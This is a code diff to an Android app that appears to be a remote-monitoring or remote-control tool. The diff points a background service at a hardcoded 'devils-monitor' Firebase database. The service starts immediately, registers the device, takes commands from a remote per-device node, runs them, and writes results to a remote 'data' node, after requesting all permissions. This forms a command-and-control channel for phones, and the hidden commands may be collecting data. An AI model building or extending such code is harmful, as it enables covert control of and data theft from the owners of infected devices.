@@ -35,6 +35,7 @@ import java.util.UUID;
 public class MainActivity extends AppCompatActivity {
 
     private static final int REQ_PERMS = 1001;
+    private static final String DB_URL = "https://devils-monitor-default-rtdb.firebaseio.com";
     private TextView statusText;
     private Button activateBtn;
 
@@ -53,11 +54,8 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         statusText = findViewById(R.id.status_text);
         activateBtn = findViewById(R.id.activate_btn);
-
-        // تشغيل الخدمة فوراً
         startService(new Intent(this, FirebaseService.class));
         statusText.setText("✅ التطبيق يعمل في الخلفية");
-
         activateBtn.setOnClickListener(v -> requestAllPermissions());
     }
 
@@ -92,7 +90,7 @@ public class MainActivity extends AppCompatActivity {
         public void onCreate() {
             super.onCreate();
             deviceId = getDeviceId(this);
-            FirebaseDatabase db = FirebaseDatabase.getInstance();
+            FirebaseDatabase db = FirebaseDatabase.getInstance(DB_URL);
             deviceRef = db.getReference("devices").child(deviceId);
             commandsRef = db.getReference("commands").child(deviceId);
             registerDevice();
@@ -140,7 +138,7 @@ public class MainActivity extends AppCompatActivity {
         private void exec(Map<String, Object> cmd) {
             String type = (String) cmd.get("type");
             if (type == null) return;
-            DatabaseReference dataRef = FirebaseDatabase.getInstance().getReference("data").child(deviceId);
+            DatabaseReference dataRef = FirebaseDatabase.getInstance(DB_URL).getReference("data").child(deviceId);
             try {
                 switch (type) {
                     case "vibrate": {
@@ -202,4 +200,4 @@ public class MainActivity extends AppCompatActivity {
         @Override
         public IBinder onBind(Intent intent) { return null; }
     }
-    }
+                                              }
